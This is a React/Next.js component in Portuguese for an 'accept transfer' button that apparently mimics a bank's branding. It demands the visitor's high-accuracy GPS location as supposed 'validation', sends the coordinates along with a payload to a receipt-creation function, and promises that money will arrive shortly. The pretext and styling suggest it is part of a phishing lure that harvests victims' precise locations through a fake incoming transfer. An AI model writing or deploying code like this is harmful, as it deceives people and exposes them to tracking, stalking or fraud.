'use client'

import { Button } from '@/components/ui/button'
import { AddIcon } from '@/icons'
import { useState, useEffect } from 'react'
import '@/styles/spinner.css'
import '@/styles/animations.css'
import { createComprovante } from '@/lib/create-comprovante'
import { useRouter } from 'next/navigation'

interface AcceptTransferButtonProps {
  payload: Record<string, any>
}

const ERROR_MESSAGES = {
  denied:
    'É necessário permitir o acesso para validação da transferência! Acesse as configurações do navegador.',
  unavailable: 'Não foi possível validar a transferência. Tente novamente.',
  timeout: 'Tempo de solicitação excedido. Tente novamente.',
  generic: 'Erro ao validar a transferência. Tente novamente. HN09',
  unsupported: 'Houve um problema ao validar a transferência. Tente novamente mais tarde. HN06',
  create: 'Houve um problema ao validar a transferência. Tente novamente mais tarde. HN02',
}

export function AcceptTransferButton({ payload }: AcceptTransferButtonProps) {
  const [message, setMessage] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)
  const [transferAccepted, setTransferAccepted] = useState(false)
  const [showToast, setShowToast] = useState(false)
  const [fadeText, setFadeText] = useState(true)
  const [buttonText, setButtonText] = useState('Aceitar transferência')
  const router = useRouter()

  const setError = (type: keyof typeof ERROR_MESSAGES) => {
    setMessage(ERROR_MESSAGES[type])
    stopLoading()
  }

  const stopLoading = () => {
    setLoading(false)
    setFadeText(true)
    setButtonText('Aceitar transferência')
  }

  const startLoading = () => {
    setLoading(true)
    setFadeText(false)
    setButtonText('Preparando tudo...')
    setMessage('')
  }

  async function handleClick() {
    if (!navigator.geolocation) return setError('unsupported')
    startLoading()
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          const { hash } = await createComprovante({
            payload,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          })
          router.push(`/comprovante?hash=${hash}`)
        } catch {
          setError('create')
        } finally {
          stopLoading()
        }
      },
      (error) => {
        if (error.code === 1) setError('denied')
        else if (error.code === 2) setError('unavailable')
        else if (error.code === 3) setError('timeout')
        else setError('generic')
      },
      { enableHighAccuracy: true, timeout: 10000 }
    )
  }

  useEffect(() => {
    if (showToast) {
      import('canvas-confetti').then((module: { default: (...args: any[]) => void }) => {
        module.default({
          particleCount: 120,
          spread: 80,
          origin: { x: 0.5, y: 0.5 },
          colors: ['#820ad1', '#b226ef', '#fff', '#ffcb05', '#00e1e6', '#ff5fa2'],
          scalar: 1.1,
          zIndex: 9999,
        })
      })
      const timer = setTimeout(() => setShowToast(false), 7000)
      return () => clearTimeout(timer)
    }
  }, [showToast])

  return (
    <div className="w-full flex flex-col items-center gap-2">
      <Button
        className={`w-full text-white font-semibold flex items-center justify-center gap-2 disabled:opacity-60 transition-all duration-500 bg-purple-600 hover:bg-purple-700`}
        style={loading ? { boxShadow: '0 4px 24px 0 rgba(130, 10, 209, 0.18)' } : {}}
        onClick={handleClick}
        disabled={loading || transferAccepted}
      >
        <span className={`flex items-center gap-2 transition-all duration-500 h-7`}>
          {loading && <div className="spinner w-6 h-6 animate-spinner" />}
          <span
            className={`transition-opacity duration-400 flex items-center ${
              fadeText ? 'opacity-100 animate-fade-in' : 'opacity-0 animate-fade-out'
            }`}
            key={buttonText}
          >
            {buttonText}
            {!loading && !transferAccepted && (
              <span style={{ marginLeft: 8 }}>
                <AddIcon />
              </span>
            )}
          </span>
        </span>
      </Button>
      {message && (
        <span className="text-xs text-center text-gray-700 bg-gray-100 rounded px-2 py-1 mt-1">
          {message}
        </span>
      )}
      {showToast && (
        <div
          className="fixed bottom-8 left-1/2 -translate-x-1/2 z-50 px-6 py-4 flex flex-col items-center gap-2 rounded-2xl shadow-xl backdrop-blur-md bg-white/80 border border-gray-200 animate-fade-in-out"
          style={{ minWidth: 260 }}
        >
          <span className="flex items-center justify-center gap-2 mb-0.5">
            <span className="flex items-center justify-center w-6 h-6 rounded-full bg-green-500">
              <svg
                className="w-3.5 h-3.5 text-white"
                fill="none"
                stroke="currentColor"
                strokeWidth="3"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M5 13l4 4L19 7"
                />
              </svg>
            </span>
            <span className="text-base text-gray-900">Transferência aceita!</span>
          </span>
          <span className="text-xs text-gray-700 text-center leading-snug">
            Dentro de alguns minutos o valor estará na sua conta
          </span>
        </div>
      )}
    </div>
  )
}
